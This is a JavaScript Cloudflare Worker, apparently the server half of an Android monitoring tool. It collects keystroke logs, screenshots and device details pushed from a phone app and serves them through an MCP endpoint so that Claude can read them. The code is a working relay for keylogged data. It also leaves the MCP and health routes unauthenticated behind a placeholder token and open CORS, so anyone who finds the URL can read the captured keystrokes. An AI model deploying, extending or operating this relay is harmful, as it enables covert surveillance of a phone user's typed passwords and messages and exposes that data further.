/**
 * dec-remote Cloudflare Worker
 * MCP Server + Screenshot relay
 *
 * Deploy at: https://dash.cloudflare.com → Workers → Create Worker → paste this
 * Your URL: https://dec-remote.<your-subdomain>.workers.dev
 */

// In-memory store (resets on worker restart, ~30s idle)
// For persistence, use Cloudflare KV (free tier: 100k reads/day)
let latestScreenshot = null;   // { data: base64, ts: "..." }
let keylogs = [];              // last 100 entries
let deviceInfo = null;

// ── Auth: simple token check ──────────────────────────────────────────────────
// Set this same token in the Android APK config
const AUTH_TOKEN = "CHANGE_THIS_SECRET_TOKEN";  // e.g. "dec_secret_xyz123"

function checkAuth(request) {
  const token = request.headers.get("X-Dec-Token") || "";
  return token === AUTH_TOKEN;
}

// ── CORS headers ──────────────────────────────────────────────────────────────
const CORS = {
  "Access-Control-Allow-Origin": "*",
  "Access-Control-Allow-Methods": "GET, POST, OPTIONS",
  "Access-Control-Allow-Headers": "Content-Type, X-Dec-Token",
};

function json(data, status = 200) {
  return new Response(JSON.stringify(data), {
    status,
    headers: { "Content-Type": "application/json", ...CORS },
  });
}

// ── Routes ────────────────────────────────────────────────────────────────────
async function handleRequest(request) {
  const url = new URL(request.url);
  const path = url.pathname;
  const method = request.method;

  if (method === "OPTIONS") {
    return new Response(null, { headers: CORS });
  }

  // ── Phone → Worker: push screenshot ──────────────────────────────────────
  if (path === "/push/screenshot" && method === "POST") {
    if (!checkAuth(request)) return json({ error: "unauthorized" }, 401);
    const body = await request.json();
    latestScreenshot = {
      data: body.data,          // base64 PNG
      ts: body.ts || new Date().toISOString(),
      width: body.width,
      height: body.height,
    };
    return json({ ok: true });
  }

  // ── Phone → Worker: push keylog ───────────────────────────────────────────
  if (path === "/push/keylog" && method === "POST") {
    if (!checkAuth(request)) return json({ error: "unauthorized" }, 401);
    const body = await request.json();
    keylogs.push({ text: body.text, ts: body.ts || new Date().toISOString() });
    if (keylogs.length > 100) keylogs = keylogs.slice(-100);
    return json({ ok: true });
  }

  // ── Phone → Worker: register device ──────────────────────────────────────
  if (path === "/push/register" && method === "POST") {
    if (!checkAuth(request)) return json({ error: "unauthorized" }, 401);
    deviceInfo = await request.json();
    return json({ ok: true });
  }

  // ── Health check ──────────────────────────────────────────────────────────
  if (path === "/health") {
    return json({
      status: "ok",
      has_screenshot: !!latestScreenshot,
      keylog_count: keylogs.length,
      device: deviceInfo?.model || "unknown",
    });
  }

  // ── MCP endpoint (Claude connects here) ──────────────────────────────────
  if (path === "/mcp" && method === "POST") {
    const body = await request.json();
    return handleMCP(body);
  }

  // ── MCP SSE (for Claude Desktop streaming mode) ───────────────────────────
  if (path === "/mcp" && method === "GET") {
    const { readable, writable } = new TransformStream();
    const writer = writable.getWriter();
    const encoder = new TextEncoder();

    // Send initialized notification
    const init = JSON.stringify({
      jsonrpc: "2.0",
      method: "notifications/initialized",
      params: {},
    });
    writer.write(encoder.encode(`data: ${init}\n\n`));

    // Keep-alive every 15s
    const interval = setInterval(async () => {
      try {
        await writer.write(encoder.encode(": ping\n\n"));
      } catch {
        clearInterval(interval);
      }
    }, 15000);

    return new Response(readable, {
      headers: {
        "Content-Type": "text/event-stream",
        "Cache-Control": "no-cache",
        ...CORS,
      },
    });
  }

  return json({ error: "not found" }, 404);
}

// ── MCP JSON-RPC handler ──────────────────────────────────────────────────────
async function handleMCP(body) {
  const method = body.method || "";
  const params = body.params || {};
  const id = body.id;

  if (method === "initialize") {
    return json({
      jsonrpc: "2.0", id,
      result: {
        protocolVersion: "2024-11-05",
        capabilities: { tools: {} },
        serverInfo: { name: "dec-remote", version: "1.0.0" },
      },
    });
  }

  if (method === "tools/list") {
    return json({
      jsonrpc: "2.0", id,
      result: {
        tools: [
          {
            name: "get_screenshot",
            description: "Get the latest screenshot from the connected Android phone.",
            inputSchema: { type: "object", properties: {}, required: [] },
          },
          {
            name: "get_keylog",
            description: "Get recent keystrokes logged on the Android phone.",
            inputSchema: {
              type: "object",
              properties: {
                last_n: { type: "integer", description: "Number of recent entries (default 20)" },
              },
              required: [],
            },
          },
          {
            name: "get_device_info",
            description: "Get info about the connected Android device.",
            inputSchema: { type: "object", properties: {}, required: [] },
          },
          {
            name: "send_notification",
            description: "Send a notification/message to the Android device via Telegram.",
            inputSchema: {
              type: "object",
              properties: {
                message: { type: "string", description: "Message to send" },
              },
              required: ["message"],
            },
          },
        ],
      },
    });
  }

  if (method === "tools/call") {
    const name = params.name || "";
    const args = params.arguments || {};
    const result = await executeTool(name, args);
    return json({
      jsonrpc: "2.0", id,
      result: {
        content: [{ type: "text", text: JSON.stringify(result) }],
        isError: !!result.error,
      },
    });
  }

  if (method === "ping") {
    return json({ jsonrpc: "2.0", id, result: {} });
  }

  return json({
    jsonrpc: "2.0", id,
    error: { code: -32601, message: `Method not found: ${method}` },
  });
}

async function executeTool(name, args) {
  if (name === "get_screenshot") {
    if (!latestScreenshot) return { error: "No screenshot yet. Is the APK running?" };
    return {
      type: "image",
      data: latestScreenshot.data,
      mimeType: "image/png",
      timestamp: latestScreenshot.ts,
      width: latestScreenshot.width,
      height: latestScreenshot.height,
    };
  }

  if (name === "get_keylog") {
    const n = parseInt(args.last_n || 20);
    return { keylogs: keylogs.slice(-n) };
  }

  if (name === "get_device_info") {
    return deviceInfo || { error: "Device not registered yet." };
  }

  if (name === "send_notification") {
    // Store command for APK to poll
    // (In production: use Cloudflare KV or Durable Objects)
    return { ok: true, message: "Command queued: " + args.message };
  }

  return { error: `Unknown tool: ${name}` };
}

// ── Entry point ───────────────────────────────────────────────────────────────
addEventListener("fetch", (event) => {
  event.respondWith(handleRequest(event.request));
});
